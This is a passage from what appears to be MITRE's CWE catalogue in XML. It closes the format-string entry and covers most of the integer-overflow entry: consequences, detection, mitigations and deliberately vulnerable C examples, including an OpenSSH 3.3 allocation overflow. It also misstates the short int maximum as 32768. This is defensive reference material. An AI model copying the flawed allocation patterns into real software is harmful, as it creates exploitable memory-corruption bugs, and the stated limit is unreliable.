               <Reference_Link>http://www.securityfocus.com/archive/1/418460/30/0/threaded</Reference_Link>
            </Reference>
            <Reference Local_Reference_ID="R.134.2">
               <Reference_Author>Hal Burch</Reference_Author>
               <Reference_Author>Robert C. Seacord</Reference_Author>
               <Reference_Title>Programming Language Format String
						Vulnerabilities</Reference_Title>
               <Reference_Link>http://www.ddj.com/dept/security/197002914</Reference_Link>
            </Reference>
            <Reference Local_Reference_ID="R.134.3">
               <Reference_Author>Tim Newsham</Reference_Author>
               <Reference_Title>Format String Attacks</Reference_Title>
               <Reference_Publisher>Guardent</Reference_Publisher>
               <Reference_PubDate>September 2000</Reference_PubDate>
               <Reference_Link>http://www.thenewsh.com/~newsham/format-string-attacks.pdf</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-11" Local_Reference_ID="R.134.4">
               <Reference_Author>M. Howard</Reference_Author>
               <Reference_Author>D. LeBlanc</Reference_Author>
               <Reference_Title>Writing Secure Code</Reference_Title>
               <Reference_Section>Chapter 5, "Format String Bugs" Page 147</Reference_Section>
               <Reference_Edition>2nd Edition</Reference_Edition>
               <Reference_Publisher>Microsoft</Reference_Publisher>
               <Reference_PubDate>2002</Reference_PubDate>
            </Reference>
            <Reference Reference_ID="REF-17" Local_Reference_ID="R.134.5">
               <Reference_Author>Michael Howard</Reference_Author>
               <Reference_Author>David LeBlanc</Reference_Author>
               <Reference_Author>John Viega</Reference_Author>
               <Reference_Title>24 Deadly Sins of Software Security</Reference_Title>
               <Reference_Section>"Sin 6: Format String Problems." Page 109</Reference_Section>
               <Reference_Publication>McGraw-Hill</Reference_Publication>
               <Reference_PubDate>2010</Reference_PubDate>
            </Reference>
            <Reference Reference_ID="REF-7" Local_Reference_ID="R.134.5">
               <Reference_Author>Mark Dowd</Reference_Author>
               <Reference_Author>John McDonald</Reference_Author>
               <Reference_Author>Justin Schuh</Reference_Author>
               <Reference_Title>The Art of Software Security Assessment</Reference_Title>
               <Reference_Section>Chapter 8, "C Format Strings", Page 422.</Reference_Section>
               <Reference_Edition>1st Edition</Reference_Edition>
               <Reference_Publisher>Addison Wesley</Reference_Publisher>
               <Reference_PubDate>2006</Reference_PubDate>
            </Reference>
         </References>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="PLOVER">
               <Mapped_Node_Name>Format string vulnerability</Mapped_Node_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="7 Pernicious Kingdoms">
               <Mapped_Node_Name>Format String</Mapped_Node_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CLASP">
               <Mapped_Node_Name>Format string problem</Mapped_Node_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C Secure Coding">
               <Mapped_Node_Name>Exclude user input from format strings</Mapped_Node_Name>
               <Mapped_Node_ID>FIO30-C</Mapped_Node_ID>
               <Mapping_Fit>Exact</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="OWASP Top Ten 2004">
               <Mapped_Node_Name>Unvalidated Input</Mapped_Node_Name>
               <Mapped_Node_ID>A1</Mapped_Node_ID>
               <Mapping_Fit>CWE_More_Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C Secure Coding">
               <Mapped_Node_Name>Exclude user input from format strings</Mapped_Node_Name>
               <Mapped_Node_ID>FIO30-C</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="WASC">
               <Mapped_Node_Name>Format String </Mapped_Node_Name>
               <Mapped_Node_ID>6</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT Java Secure Coding">
               <Mapped_Node_Name>Exclude user input from format strings</Mapped_Node_Name>
               <Mapped_Node_ID>IDS06-J</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C++ Secure Coding">
               <Mapped_Node_Name>Exclude user input from format strings</Mapped_Node_Name>
               <Mapped_Node_ID>FIO30-CPP</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="Software Fault Patterns">
               <Mapped_Node_Name>Tainted input to command</Mapped_Node_Name>
               <Mapped_Node_ID>SFP24</Mapped_Node_ID>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <White_Box_Definitions>
            <White_Box_Definition>
               <Text>A weakness where the code path has:</Text>
               <Block>
                  <Text>1. start statement that accepts input</Text>
                  <Text>2. end statement that passes a format string to format string function
							where</Text>
                  <Block>
                     <Text>a. the input data is part of the format string and</Text>
                     <Text>b. the format string is undesirable</Text>
                  </Block>
               </Block>
               <Text>Where "undesirable" is defined through the following scenarios:</Text>
               <Block>
                  <Text>1. not validated</Text>
                  <Text>2. incorrectly validated</Text>
               </Block>
            </White_Box_Definition>
         </White_Box_Definitions>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>135</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>67</CAPEC_ID>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Content_History>
            <Submission Submission_Source="Externally_Mined">
               <Submitter>PLOVER</Submitter>
            </Submission>
            <Modification Modification_Source="External">
               <Modifier_Organization>KDM Analytics</Modifier_Organization>
               <Modification_Date>2008-08-01</Modification_Date>
               <Modification_Comment>added/updated white box definitions</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences,
						Detection_Factors, Modes_of_Introduction, Relationships, Other_Notes,
						Research_Gaps, Taxonomy_Mappings,
						Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2008-11-24</Modification_Date>
               <Modification_Comment>updated Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification Modification_Source="External">
               <Modifier>KDM Analytics</Modifier>
               <Modification_Date>2009-07-17</Modification_Date>
               <Modification_Comment>Improved the White_Box_Definition</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated White_Box_Definitions</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Detection_Factors, References, Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Modes_of_Introduction,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References, Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Observed_Examples, References,
						Related_Attack_Patterns, Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Detection_Factors,
						Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Description, Modes_of_Introduction, Name,
						Relationships</Modification_Comment>
            </Modification>
            <Previous_Entry_Names>
               <Previous_Entry_Name Name_Change_Date="2015-12-07">Uncontrolled Format
						String</Previous_Entry_Name>
            </Previous_Entry_Names>
         </Content_History>
      </Weakness>
                    <Weakness ID="190" Name="Integer Overflow or Wraparound" Weakness_Abstraction="Base" Status="Incomplete">
         <Description>
            <Description_Summary>The software performs a calculation that can produce an integer
					overflow or wraparound, when the logic assumes that the resulting value will
					always be larger than the original value. This can introduce other weaknesses
					when the calculation is used for resource management or execution
					control.</Description_Summary>
            <Extended_Description>
               <Text>An integer overflow or wraparound occurs when an integer value is
						incremented to a value that is too large to store in the associated
						representation. When this occurs, the value may wrap to become a very small
						or negative number. While this may be intended behavior in circumstances
						that rely on wrapping, it can have security consequences if the wrap is
						unexpected. This is especially the case if the integer overflow can be
						triggered using user-supplied inputs. This becomes security-critical when
						the result is used to control looping, make a security decision, or
						determine the offset or size in behaviors such as memory allocation,
						copying, concatenation, etc.</Text>
            </Extended_Description>
         </Description>
         <Relationships>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">900</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>865</Relationship_Target_ID>
               <!--2011 Top 25 - Risky Resource Management--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">800</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>802</Relationship_Target_ID>
               <!--2010 Top 25 - Risky Resource Management--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">1000</Relationship_View_ID>
                  <Relationship_View_ID Ordinal="Primary">699</Relationship_View_ID>
                  <Relationship_View_ID Ordinal="Primary">1003</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>682</Relationship_Target_ID>
               <!--Incorrect Calculation--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">700</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>20</Relationship_Target_ID>
               <!--Improper Input Validation--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>1000</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Chains>
                  <Relationship_Chain_ID>680</Relationship_Chain_ID>
               </Relationship_Chains>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>CanPrecede</Relationship_Nature>
               <Relationship_Target_ID>119</Relationship_Target_ID>
               <!--Improper Restriction of Operations within the Bounds of a Memory Buffer--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">734</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>738</Relationship_Target_ID>
               <!--CERT C Secure Coding Section 04 - Integers (INT)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>734</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>742</Relationship_Target_ID>
               <!--CERT C Secure Coding Section 08 - Memory Management (MEM)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">868</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>872</Relationship_Target_ID>
               <!--CERT C++ Secure Coding Section 04 - Integers (INT)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>868</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>876</Relationship_Target_ID>
               <!--CERT C++ Secure Coding Section 08 - Memory Management (MEM)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">888</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>998</Relationship_Target_ID>
               <!--SFP Secondary Cluster: Glitch in Computation--></Relationship>
         </Relationships>
         <Relationship_Notes>
            <Relationship_Note>
               <Text>Integer overflows can be primary to buffer overflows.</Text>
            </Relationship_Note>
         </Relationship_Notes>
         <Applicable_Platforms>
            <Languages>
               <Language_Class Language_Class_Description="Language-independent"/>
            </Languages>
         </Applicable_Platforms>
         <Terminology_Notes>
            <Terminology_Note>
               <Text>"Integer overflow" is sometimes used to cover several types of errors,
						including signedness errors, or buffer overflows that involve manipulation
						of integer data types instead of characters. Part of the confusion results
						from the fact that 0xffffffff is -1 in a signed context. Other confusion
						also arises because of the role that integer overflows have in
						chains.</Text>
            </Terminology_Note>
         </Terminology_Notes>
         <Time_of_Introduction>
            <Introductory_Phase>Implementation</Introductory_Phase>
         </Time_of_Introduction>
         <Likelihood_of_Exploit>Medium</Likelihood_of_Exploit>
         <Common_Consequences>
            <Common_Consequence>
               <Consequence_Scope>Availability</Consequence_Scope>
               <Consequence_Technical_Impact>DoS: crash / exit /
						restart</Consequence_Technical_Impact>
               <Consequence_Technical_Impact>DoS: resource consumption
						(CPU)</Consequence_Technical_Impact>
               <Consequence_Technical_Impact>DoS: resource consumption
						(memory)</Consequence_Technical_Impact>
               <Consequence_Technical_Impact>DoS: instability</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>This weakness will generally lead to undefined behavior and therefore
							crashes. In the case of overflows involving loop index variables, the
							likelihood of infinite loops is also high.</Text>
               </Consequence_Note>
            </Common_Consequence>
            <Common_Consequence>
               <Consequence_Scope>Integrity</Consequence_Scope>
               <Consequence_Technical_Impact>Modify memory</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>If the value in question is important to data (as opposed to flow),
							simple data corruption has occurred. Also, if the wrap around results in
							other conditions such as buffer overflows, further memory corruption may
							occur.</Text>
               </Consequence_Note>
            </Common_Consequence>
            <Common_Consequence>
               <Consequence_Scope>Confidentiality</Consequence_Scope>
               <Consequence_Scope>Availability</Consequence_Scope>
               <Consequence_Scope>Access_Control</Consequence_Scope>
               <Consequence_Technical_Impact>Execute unauthorized code or
						commands</Consequence_Technical_Impact>
               <Consequence_Technical_Impact>Bypass protection
						mechanism</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>This weakness can sometimes trigger buffer overflows which can be used
							to execute arbitrary code. This is usually outside the scope of a
							program's implicit security policy.</Text>
               </Consequence_Note>
            </Common_Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-1">
               <Method_Name>Automated Static Analysis</Method_Name>
               <Method_Description>
                  <Text>This weakness can often be detected using automated static analysis
							tools. Many modern tools use data flow analysis or constraint-based
							techniques to minimize the number of false positives.</Text>
               </Method_Description>
               <Method_Effectiveness>High</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-2">
               <Method_Name>Black Box</Method_Name>
               <Method_Description>
                  <Text>Sometimes, evidence of this weakness can be detected using dynamic
							tools and techniques that interact with the software using large test
							suites with many diverse inputs, such as fuzz testing (fuzzing),
							robustness testing, and fault injection. The software's operation may
							slow down, but it should not become unstable, crash, or generate
							incorrect results.</Text>
               </Method_Description>
               <Method_Effectiveness>Moderate</Method_Effectiveness>
               <Method_Effectiveness_Notes>
                  <Text>Without visibility into the code, black box methods may not be able to
							sufficiently distinguish this weakness from others, requiring follow-up
							manual methods to diagnose the underlying problem. </Text>
               </Method_Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-7">
               <Method_Name>Manual Analysis</Method_Name>
               <Method_Description>
                  <Text>This weakness can be detected using tools and techniques that require
							manual (human) analysis, such as penetration testing, threat modeling,
							and interactive tools that allow the tester to record and modify an
							active session. </Text>
                  <Text>Specifically, manual static analysis is useful for evaluating the
							correctness of allocation calculations. This can be useful for detecting
							overflow conditions (CWE-190) or similar weaknesses that might have
							serious security impacts on the program.</Text>
               </Method_Description>
               <Method_Effectiveness>High</Method_Effectiveness>
               <Method_Effectiveness_Notes>
                  <Text> These may be more effective than strictly automated techniques. This
							is especially the case with weaknesses that are related to design and
							business rules.</Text>
               </Method_Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Automated Static Analysis - Binary / Bytecode</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Bytecode Weakness Analysis - including disassembler + source
									code weakness analysis</Text>
                        <Text>Binary Weakness Analysis - including disassembler + source
									code weakness analysis</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Dynamic Analysis with manual results interpretation</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Fuzz Tester</Text>
                        <Text>Framework-based Fuzzer</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Manual Static Analysis - Source Code</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Manual Source Code Review (not inspections)</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Automated Static Analysis - Source Code</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Source code Weakness Analyzer</Text>
                        <Text>Context-configured Source Code Weakness Analyzer</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Architecture / Design Review</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Formal Methods / Correct-By-Construction</Text>
                     </Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Inspection (IEEE 1028 standard) (can apply to requirements,
									design, source code, etc.)</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Mitigation_Phase>Requirements</Mitigation_Phase>
               <Mitigation_Description>
                  <Text> Ensure that all protocols are strictly defined, such that all
							out-of-bounds behavior can be identified simply, and require strict
							conformance to the protocol.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-3">
               <Mitigation_Phase>Requirements</Mitigation_Phase>
               <Mitigation_Strategy>Language Selection</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Use a language that does not allow this weakness to occur or provides
							constructs that make this weakness easier to avoid.</Text>
                  <Text>If possible, choose a language or compiler that performs automatic
							bounds checking.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-4">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Strategy>Libraries or Frameworks</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Use a vetted library or framework that does not allow this weakness to
							occur or provides constructs that make this weakness easier to
							avoid.</Text>
                  <Text>Use libraries or frameworks that make it easier to handle numbers
							without unexpected consequences.</Text>
                  <Text>Examples include safe integer handling packages such as SafeInt (C++)
							or IntegerLib (C or C++). [R.190.5]</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-8">
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Strategy>Input Validation</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Perform input validation on any numeric input by ensuring that it is
							within the expected range. Enforce that the input meets both the minimum
							and maximum requirements for the expected range.</Text>
                  <Text>Use unsigned integers where possible. This makes it easier to perform
							sanity checks for integer overflows. When signed integers are required,
							ensure that the range check includes minimum values as well as maximum
							values.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-36">
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Understand the programming language's underlying representation and
							how it interacts with numeric calculation (CWE-681). Pay close attention
							to byte size discrepancies, precision, signed/unsigned distinctions,
							truncation, conversion and casting between types, "not-a-number"
							calculations, and how the language handles numbers that are too large or
							too small for its underlying representation. [R.190.3]</Text>
                  <Text>Also be careful to account for 32-bit, 64-bit, and other potential
							differences that may affect the numeric representation.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-15">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>For any security checks that are performed on the client side, ensure
							that these checks are duplicated on the server side, in order to avoid
							CWE-602. Attackers can bypass the client-side checks by modifying values
							after the checks have been performed, or by changing the client to
							remove the client-side checks entirely. Then, these modified values
							would be submitted to the server.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-26">
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Strategy>Compilation or Build Hardening</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Examine compiler warnings closely and eliminate problems with
							potential security implications, such as signed / unsigned mismatch in
							memory operations, or use of uninitialized variables. Even if the
							weakness is rarely exploitable, a single failure may lead to the
							compromise of the entire system.</Text>
               </Mitigation_Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-33">
               <Intro_Text>The following image processing code allocates a table for
						images.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>C</Code_Example_Language>
                     <Code>img_t table_ptr; /*struct containing img data, 10kB each*/</Code>
                     <Code>int num_imgs;</Code>
                     <Code>...</Code>
                     <Code>num_imgs = get_num_imgs();</Code>
                     <Code>table_ptr = (img_t*)malloc(sizeof(img_t)*num_imgs);</Code>
                     <Code>...</Code>
                  </Block>
                  <Text>This code intends to allocate a table of size num_imgs, however as
							num_imgs grows large, the calculation determining the size of the list
							will eventually overflow (CWE-190). This will result in a very small
							list to be allocated instead. If the subsequent code operates on the
							list as if it were num_imgs long, it may result in many types of
							out-of-bounds problems (CWE-119).</Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following code excerpt from OpenSSH 3.3 demonstrates a classic
						case of integer overflow:</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>C</Code_Example_Language>
                     <Code>nresp = packet_get_int();</Code>
                     <Code>if (nresp &gt; 0) {</Code>
                     <Block>
                        <Code>response = xmalloc(nresp*sizeof(char*));</Code>
                        <Code>for (i = 0; i &lt; nresp; i++) response[i] =
									packet_get_string(NULL);</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Text>If nresp has the value 1073741824 and sizeof(char*) has its typical
							value of 4, then the result of the operation nresp*sizeof(char*)
							overflows, and the argument to xmalloc() will be 0. Most malloc()
							implementations will happily allocate a 0-byte buffer, causing the
							subsequent loop iterations to overflow the heap buffer response.</Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>Integer overflows can be complicated and difficult to detect. The
						following example is an attempt to show how an integer overflow may lead to
						undefined looping behavior:</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>C</Code_Example_Language>
                     <Code>short int bytesRec = 0;</Code>
                     <Code>char buf[SOMEBIGNUM];</Code>
                     <Code/>
                     <Code>while(bytesRec &lt; MAXGET) {</Code>
                     <Block>
                        <Code>bytesRec += getFromInput(buf+bytesRec);</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Text>In the above case, it is entirely possible that bytesRec may overflow,
							continuously creating a lower number than MAXGET and also overwriting
							the first MAXGET-1 bytes of buf.</Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>In this example the method determineFirstQuarterRevenue is used to
						determine the first quarter revenue for an accounting/business application.
						The method retrieves the monthly sales totals for the first three months of
						the year, calculates the first quarter sales totals from the monthly sales
						totals, calculates the first quarter revenue based on the first quarter
						sales, and finally saves the first quarter revenue results to the
						database.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>C</Code_Example_Language>
                     <Code>#define JAN 1</Code>
                     <Code>#define FEB 2</Code>
                     <Code>#define MAR 3</Code>
                     <Code/>
                     <Code>short getMonthlySales(int month) {...}</Code>
                     <Code/>
                     <Code>float calculateRevenueForQuarter(short quarterSold) {...}</Code>
                     <Code/>
                     <Code>int determineFirstQuarterRevenue() {</Code>
                     <Block>
                        <Code/>
                        <Comment>// Variable for sales revenue for the quarter</Comment>
                        <Code>float quarterRevenue = 0.0f;</Code>
                        <Code/>
                        <Code>short JanSold = getMonthlySales(JAN); /* Get sales in January
									*/</Code>
                        <Code>short FebSold = getMonthlySales(FEB); /* Get sales in February
									*/</Code>
                        <Code>short MarSold = getMonthlySales(MAR); /* Get sales in March
									*/</Code>
                        <Code/>
                        <Comment>// Calculate quarterly total</Comment>
                        <Code>short quarterSold = JanSold + FebSold + MarSold;</Code>
                        <Code/>
                        <Comment>// Calculate the total revenue for the quarter</Comment>
                        <Code>quarterRevenue =
									calculateRevenueForQuarter(quarterSold);</Code>
                        <Code/>
                        <Code>saveFirstQuarterRevenue(quarterRevenue);</Code>
                        <Code/>
                        <Code>return 0;</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Text> However, in this example the primitive type short int is used for
							both the monthly and the quarterly sales variables. In C the short int
							primitive type has a maximum value of 32768. This creates a potential
							integer overflow if the value for the three monthly sales adds up to
							more than the maximum value for the short int primitive type. An integer
							overflow can lead to data corruption, unexpected behavior, infinite
							loops and system crashes. To correct the situation the appropriate
							primitive type should be used, as in the example below, and/or provide
							some validation mechanism to ensure that the maximum value for the
							primitive type is not exceeded.</Text>
                  <Block Block_Nature="Good_Code">
                     <Code_Example_Language>C</Code_Example_Language>
                     <Code>...</Code>
                     <Code>float calculateRevenueForQuarter(long quarterSold) {...}</Code>
                     <Code/>
                     <Code>int determineFirstQuarterRevenue() {</Code>
                     <Block>
                        <Code>...</Code>
                        <Comment>// Calculate quarterly total</Comment>
                        <Code>long quarterSold = JanSold + FebSold + MarSold;</Code>
                        <Code/>
                        <Comment>// Calculate the total revenue for the quarter</Comment>
                        <Code>quarterRevenue =
									calculateRevenueForQuarter(quarterSold);</Code>
                        <Code/>
                        <Code>...</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Text>Note that an integer overflow could also occur if the quarterSold
							variable has a primitive type long but the method
							calculateRevenueForQuarter has a parameter of type short.</Text>
               </Example_Body>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2010-2753</Observed_Example_Reference>
               <Observed_Example_Description> chain: integer overflow leads to
						use-after-free</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2002-0391</Observed_Example_Reference>
               <Observed_Example_Description>Integer overflow via a large number of
						arguments.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
